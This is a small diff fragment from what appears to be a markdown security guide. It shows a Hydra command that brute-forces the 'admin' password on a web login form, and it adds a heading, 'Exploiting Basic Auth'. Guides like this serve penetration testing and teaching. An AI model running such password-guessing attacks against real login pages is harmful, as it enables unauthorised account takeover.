@@ -6,3 +6,4 @@
 ```bash
 hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
 ```
+## Exploiting Basic Auth 
